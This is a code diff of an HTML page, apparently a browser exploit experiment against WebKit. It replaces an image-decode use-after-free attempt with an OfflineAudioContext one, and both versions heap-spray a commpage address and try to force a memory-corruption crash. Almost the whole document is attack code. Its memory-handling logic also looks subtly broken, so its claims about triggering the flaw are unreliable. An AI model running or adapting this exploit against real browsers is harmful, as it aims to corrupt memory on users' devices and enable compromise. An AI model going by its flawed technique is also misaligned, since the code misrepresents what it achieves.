@@ -1,13 +1,13 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Image Decode UAF Callback Attack</title>
+    <title>OfflineAudioContext UAF (Synchronous Attack)</title>
 </head>
 <body>
 
-    <h1>Image Decode UAF Callback (Stealth Attack)</h1>
+    <h1>OfflineAudioContext UAF (Sinkron Agresif)</h1>
     <p>Target Commpage Address: 0x0000000FFFFFC320</p>
-    <p id="status">INIT: Mempersiapkan Image Decode Race...</p>
+    <p id="status">INIT: Mempersiapkan Audio Context Sinkron...</p>
     <div id="log"></div>
 
     <script>
@@ -19,9 +19,9 @@
         const LOW_WORD = Number(TARGET_CONTROL_ADDRESS & 0xFFFFFFFFn); 
         const HIGH_WORD = Number(TARGET_CONTROL_ADDRESS >> 32n);
 
-        let imageList = [];
+        let offlineCtx = null;
+        let victimNode = null;
         let payloadHolders = []; 
-        let currentImage = null;
 
         function log(message) {
             document.getElementById('log').innerHTML += `<div style="margin: 2px 0;">${message}</div>`;
@@ -29,74 +29,96 @@
         
         // --- FUNGSI HEAP SPRAY PAYLOAD ---
         function sprayPayload() {
-            // Menggunakan TypedArray untuk menargetkan pointer C++
-            const SPRAY_COUNT = 1000;
+            const SPRAY_COUNT = 1500; // Peningkatan agresivitas spray
             const PAYLOAD_SIZE = 64; 
 
             for (let i = 0; i < SPRAY_COUNT; i++) {
                 let payloadArray = new Float64Array(PAYLOAD_SIZE);
                 payloadArray[0] = HIGH_WORD; 
                 payloadArray[1] = LOW_WORD;
-                payloadArray[2] = 2027.0 + i; 
+                payloadArray[2] = 2028.0 + i; 
                 payloadHolders.push(payloadArray); 
             }
         }
 
         // --- FUNGSI UTAMA ATTACK ---
-        async function runImageAttack() {
-            log("Phase 1: Menciptakan Elemen Gambar dan Data.");
-
-            // 1. Buat BLOB (Sumber gambar kecil yang valid)
-            const imageData = new Uint8Array([71, 73, 70, 56, 57, 97, 1, 0, 1, 0, 128, 0, 0, 0, 0, 0, 255, 255, 255, 33, 249, 4, 1, 0, 0, 0, 0, 44, 0, 0, 0, 0, 1, 0, 1, 0, 0, 2, 2, 76, 1, 0, 59]);
-            const blob = new Blob([imageData], { type: 'image/gif' });
-            const url = URL.createObjectURL(blob);
+        function runOfflineAttack() {
+            log("Phase 1: Membuat OfflineAudioContext.");
             
-            currentImage = new Image();
-            currentImage.src = url;
-
-            log("Phase 2: Memulai Decode dan Memicu UAF Race...");
-
-            // 2. Memicu Decode Asynchronous (Memulai thread decode C++)
-            const decodePromise = currentImage.decode(); 
-
-            // 3. Memicu UAF Race
-            // Segera hapus elemen gambar di DOM dan referensi, tetapi janji (Promise) decode masih hidup!
-            currentImage.remove(); 
-            currentImage = null; 
-
-            // 4. Lakukan Spray Payload dengan Micro-Timing
-            // Tujuannya: Menimpa pointer callback C++ di tengah proses decode
-            setTimeout(sprayPayload, 0); 
-            log("Phase 3: Heap Spray dipicu setelah penghapusan referensi.");
-
-            // 5. Trigger Eksploitasi (Callback Execution)
-            // Tunggu Promise decode selesai. Jika decode berhasil, ia akan mencoba
-            // menjalankan callback pada elemen yang sudah di-free/ditimpa.
-            
+            // 1. Inisialisasi Offline Context (Sinkron)
             try {
-                await decodePromise; 
-                log("Decode Promise berhasil diselesaikan. Menunggu Crash Implisit.");
-                
-                // Trigger tambahan: Coba akses DOM setelah decode
-                document.body.appendChild(document.createElement('div'));
+                // Buat context kecil, cepat selesai
+                offlineCtx = new (window.OfflineAudioContext || window.webkitOfflineAudioContext)(1, 44100 * 1, 44100); 
+            } catch(e) {
+                log("ERROR: OfflineAudioContext tidak didukung.");
+                return;
+            }
 
-            } catch(e) {
-                // Jika promise gagal (misalnya karena UAF), ini adalah indikasi yang baik!
-                log("Decode Promise GAGAL (Sinyal UAF): " + e.message);
-            }
+            // 2. Alokasi Korban (Victim Node)
+            let buffer = offlineCtx.createBuffer(1, 44100, 44100);
+            victimNode = offlineCtx.createBufferSource();
+            victimNode.buffer = buffer;
+            victimNode.connect(offlineCtx.destination);
+            victimNode.start(0);
+
+            log("Phase 2: Node Korban dibuat dan terhubung.");
+
+            // 3. FREE DAN SPRAY SINKRON AGRESIIF
+            // Ini adalah bagian paling sensitif. Kita lakukan FREE dan SPRAY tanpa setTimeout.
             
-            // Trigger terakhir: Mencoba create ImageBitmap dari objek yang mungkin sudah di-free
-            try {
-                 const attackerBitmap = await createImageBitmap(currentImage);
-            } catch(e) {
-                 log("Bitmap creation failed (good sign).");
-            }
+            // FREE: Putuskan koneksi (memungkinkan C++ me-free node)
+            victimNode.disconnect(); 
+            // Hapus referensi JS
+            victimNode = null; 
+            buffer = null;
+
+            log("Phase 3: FREE Node Korban (Pointer Dangling).");
+            
+            // SPRAY: Tepat setelah FREE (Hampir sinkron)
+            sprayPayload(); 
+            log("Phase 4: Heap Spray Commpage Payload.");
+
+            // 4. Memicu Trigger Cleanup/Dereference
+            log("Phase 5: Memulai Render Sinkron...");
+            
+            // Panggil render. Ini akan memaksa WebKit membersihkan dan menggunakan objek di Audio Thread.
+            offlineCtx.startRendering().then(() => {
+                // Jika tidak crash di render, coba trigger dereference JS pasca render
+                log("Render Selesai. Memicu Trigger Alternatif...");
+                triggerAlternativeCrash();
+            }).catch(e => {
+                // Jika error, seringkali ini adalah tanda UAF/Corruption
+                log("Render GAGAL (Sinyal UAF/Corrupt): " + e.message);
+                triggerAlternativeCrash();
+            });
+
+        }
+        
+        // Trigger Alternatif (Mirip UAF/Dereference sebelumnya)
+        function triggerAlternativeCrash() {
+             // 1. Coba alokasi objek Web Audio yang sama
+             let attackerCtx = new (window.AudioContext || window.webkitAudioContext)();
+             let attackerBuffer = attackerCtx.createBuffer(1, 44100, 44100); 
+             let attackerView = attackerBuffer.getChannelData(0);
+             
+             try {
+                 // 2. Akses memori di alamat awal buffer yang sekarang mungkin berisi pointer rusak
+                 let crashPtr = attackerView[0]; 
+                 
+                 // 3. FORCE CRASH: Gunakan nilai pointer yang didapat
+                 let crashNode = attackerCtx.createOscillator();
+                 // Menggunakan Commpage Address sebagai frekuensi yang tidak valid
+                 crashNode.frequency.value = crashPtr; 
+
+             } catch(e) {
+                 log("JS Error/Guard: " + e.message + " - Menunggu Crash OS (EXC_BAD_ACCESS).");
+             }
         }
         
         document.addEventListener('DOMContentLoaded', () => {
-            document.getElementById('status').textContent = 'Memulai rangkaian Image Decode UAF...';
-            setTimeout(runImageAttack, 50);
-            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah Crash Implisit.';
+            document.getElementById('status').textContent = 'Memulai rangkaian OfflineAudioContext...';
+            setTimeout(runOfflineAttack, 50);
+            document.getElementById('status').textContent = 'EKSPERIMEN AKTIF. Tujuannya adalah FREE-SPRAY Sinkron.';
         });
 
     </script>
